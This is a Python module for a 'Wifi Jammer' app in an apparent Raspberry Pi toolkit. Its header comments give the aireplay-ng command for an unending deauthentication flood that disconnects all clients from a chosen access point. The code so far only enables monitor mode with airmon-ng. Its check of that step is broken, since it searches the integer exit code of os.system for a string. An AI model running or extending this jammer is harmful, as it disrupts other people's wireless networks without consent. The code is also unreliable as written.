# sudo airmon-ng start wlan0
# iwconfig check if monitor mode is enabled

# get all bssid
# sudo airodump-ng wlan0mon --output-format csv -w /tmp/scan

# disconnect all clients
# sudo aireplay-ng --deauth 0 -a BSSID wlan0mon

from PiPerW.apps.app_interface import AppInterface
from PiPerW.pheripherals import Pheripherals
from PiPerW.display import Display
from PiPerW.helpers import Log
import os, time

display = Display()
pheripherals = Pheripherals()



class App(AppInterface):
    
    name = "Wifi Jammer"
    version = "0.1"
    
    def __init__(self):
        super().__init__(self.name, self.version)
        self.menu = None
        
    def init(self):
        Log.warning("Initializing Wifi Jammer")
        display.text("Inializing Wifi Jammer")
        time.sleep(1)
        
        Log.info("Checking if monitor mode is enabled")
        display.text("Starting monitor mode")
        os.system("sudo airmon-ng start wlan0")
        
        Log.info("Checking if monitor mode is enabled")
        display.text("Checking if monitor mode is enabled")
        res = os.system("iwconfig")
        if "mon" not in res:
            Log.error("Error enabling monitor mode not enabled, Error 4")
            display.text("Error enabling monitor mode not enabled Error 4")
            raise SystemError("Error enabling monitor mode not enabled, Error 4")
        
    

    def run(self):
        self.init()